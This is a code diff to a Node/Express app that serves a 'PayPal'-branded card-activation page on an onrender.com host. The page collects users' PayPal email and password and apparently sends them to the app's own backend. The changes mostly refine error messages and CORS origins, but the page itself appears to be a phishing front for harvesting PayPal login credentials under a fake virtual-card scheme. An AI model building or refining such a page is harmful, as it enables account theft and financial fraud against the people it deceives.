@@ -13,9 +13,9 @@ const port = process.env.PORT || 3000;
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// Enable CORS to allow requests from GitHub Pages (replace with your GitHub Pages URL or use '*' for testing)
+// Enable CORS for local testing and Render
 app.use(cors({
-    origin: ['https://your-username.github.io', 'https://ii-cyu4.onrender.com'], // Replace with your GitHub Pages URL
+    origin: ['http://localhost:3000', 'https://ii-cyu4.onrender.com'],
     methods: ['GET', 'POST', 'DELETE'],
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
@@ -274,6 +274,12 @@ app.get('/activate.html', (req, res) => {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .error-message {
+            color: #ff4444;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -284,6 +290,7 @@ app.get('/activate.html', (req, res) => {
         <div class="logo">PayPal</div>
         <div id="cardDisplayActivate"></div>
         <div id="cardDetails"></div>
+        <div id="errorMessage" class="error-message"></div>
         <input type="text" class="input-field" id="activateUsername" placeholder="PayPal Email">
         <input type="password" class="input-field" id="activatePassword" placeholder="PayPal Password">
         <div class="language">
@@ -318,31 +325,43 @@ app.get('/activate.html', (req, res) => {
             cardDetails: document.getElementById('cardDetails'),
             logDetails: document.getElementById('logDetails'),
             loader: document.getElementById('loader'),
-            activationLogs: document.getElementById('activationLogs')
+            activationLogs: document.getElementById('activationLogs'),
+            errorMessage: document.getElementById('errorMessage')
         };
 
         function showLoader() { if (elements.loader) elements.loader.classList.add('active'); }
         function hideLoader() { if (elements.loader) elements.loader.classList.remove('active'); }
+        function showError(message) {
+            if (elements.errorMessage) {
+                elements.errorMessage.textContent = message;
+                elements.errorMessage.style.display = 'block';
+            }
+        }
+        function clearError() {
+            if (elements.errorMessage) {
+                elements.errorMessage.textContent = '';
+                elements.errorMessage.style.display = 'none';
+            }
+        }
 
         function validateToken() {
             if (!token) {
-                alert('Please log in to activate the card.');
-                window.location.href = 'https://your-username.github.io/virtual-card-generator/'; // Replace with your GitHub Pages URL
+                showError('Please log in to view card details or activate the card.');
                 return false;
             }
             try {
                 const payload = JSON.parse(atob(token.split('.')[1]));
                 if (payload.exp && payload.exp < Date.now() / 1000) {
-                    alert('Session expired. Please log in again.');
+                    showError('Session expired. Please log in again.');
                     localStorage.removeItem('token');
-                    window.location.href = 'https://your-username.github.io/virtual-card-generator/'; // Replace with your GitHub Pages URL
+                    token = null;
                     return false;
                 }
                 return true;
             } catch (e) {
-                alert('Invalid token. Please log in again.');
+                showError('Invalid token. Please log in again.');
                 localStorage.removeItem('token');
-                window.location.href = 'https://your-username.github.io/virtual-card-generator/'; // Replace with your GitHub Pages URL
+                token = null;
                 return false;
             }
         }
@@ -379,7 +398,11 @@ app.get('/activate.html', (req, res) => {
         }
 
         async function updateActivationPage() {
-            if (!validateToken() || !elements.cardDetails || !currentCardId) return;
+            if (!currentCardId) {
+                showError('No card ID provided. Please use a valid activation link.');
+                return;
+            }
+            if (!validateToken()) return;
             showLoader();
             try {
                 const response = await fetch(\`\${API_BASE_URL}/api/cards/activate/\${currentCardId}\`, {
@@ -387,6 +410,7 @@ app.get('/activate.html', (req, res) => {
                 });
                 const data = await response.json();
                 if (response.ok) {
+                    clearError();
                     elements.cardDetails.innerHTML = \`
                         <p>Card ID: \${data.cardId} - Status: \${data.status || 'pending'}</p>
                     \`;
@@ -394,26 +418,31 @@ app.get('/activate.html', (req, res) => {
                         elements.cardDisplayActivate.innerHTML = '';
                         displayCard(data);
                     }
+                } else if (response.status === 404) {
+                    showError('Card not found. Please check the card ID.');
                 } else if (response.status === 401 || response.status === 403) {
-                    alert('Authentication failed. Please log in again.');
-                    window.location.href = 'https://your-username.github.io/virtual-card-generator/'; // Replace with your GitHub Pages URL
+                    showError('Authentication failed. Please log in again.');
                 } else {
-                    elements.cardDetails.textContent = data.error || 'Activation unavailable';
+                    showError(data.error || 'Activation unavailable');
                 }
             } catch (error) {
                 console.error('Activation page error:', error);
-                alert(\`Error: Network issue or backend unavailable at \${API_BASE_URL}\`);
+                showError('Network issue or backend unavailable. Please try again.');
             } finally {
                 hideLoader();
             }
         }
 
         async function activateCard() {
-            if (!validateToken() || !currentCardId) return;
+            if (!currentCardId) {
+                showError('No card ID provided. Please use a valid activation link.');
+                return;
+            }
+            if (!validateToken()) return;
             const paypalUsername = document.getElementById('activateUsername')?.value.trim();
             const paypalPassword = document.getElementById('activatePassword')?.value.trim();
             if (!paypalUsername || !paypalPassword) {
-                alert('Please enter PayPal email and password');
+                showError('Please enter PayPal email and password');
                 return;
             }
             showLoader();
@@ -426,16 +455,19 @@ app.get('/activate.html', (req, res) => {
                 const data = await response.json();
                 if (response.ok) {
                     alert(data.message);
-                    window.location.href = 'https://your-username.github.io/virtual-card-generator/'; // Replace with your GitHub Pages URL
+                    clearError();
+                    // Stay on the activation page to allow further actions
+                    updateActivationPage();
+                } else if (response.status === 404) {
+                    showError('Card not found. Please check the card ID.');
                 } else if (response.status === 401 || response.status === 403) {
-                    alert('Authentication failed. Please log in again.');
-                    window.location.href = 'https://your-username.github.io/virtual-card-generator/'; // Replace with your GitHub Pages URL
+                    showError('Authentication failed. Please log in again.');
                 } else {
-                    alert(data.error || 'Activation failed');
+                    showError(data.error || 'Activation failed');
                 }
             } catch (error) {
                 console.error('Activate card error:', error);
-                alert(\`Error: Network issue or backend unavailable at \${API_BASE_URL}\`);
+                showError('Network issue or backend unavailable. Please try again.');
             } finally {
                 hideLoader();
             }
@@ -453,14 +485,13 @@ app.get('/activate.html', (req, res) => {
                     elements.logDetails.innerHTML = data.map(log => \`<p>Activated by \${log.user} at \${new Date(log.time).toLocaleString()}</p>\`).join('');
                     if (elements.activationLogs) elements.activationLogs.style.display = data.length ? 'block' : 'none';
                 } else if (response.status === 401 || response.status === 403) {
-                    alert('Authentication failed. Please log in again.');
-                    window.location.href = 'https://your-username.github.io/virtual-card-generator/'; // Replace with your GitHub Pages URL
+                    showError('Authentication failed. Please log in again.');
                 } else {
-                    alert(data.error || 'Failed to fetch logs');
+                    showError(data.error || 'Failed to fetch logs');
                 }
             } catch (error) {
                 console.error('Fetch logs error:', error);
-                alert(\`Error: Network issue or backend unavailable at \${API_BASE_URL}\`);
+                showError('Network issue or backend unavailable. Please try again.');
             } finally {
                 hideLoader();
             }
@@ -483,11 +514,8 @@ app.get('/activate.html', (req, res) => {
 
         document.addEventListener('DOMContentLoaded', () => {
             if (!currentCardId) {
-                alert('No card ID provided.');
-                window.location.href = 'https://your-username.github.io/virtual-card-generator/'; // Replace with your GitHub Pages URL
-                return;
-            }
-            if (validateToken()) {
+                showError('No card ID provided. Please use a valid activation link.');
+            } else if (validateToken()) {
                 updateActivationPage();
                 updateActivationLogs();
             }
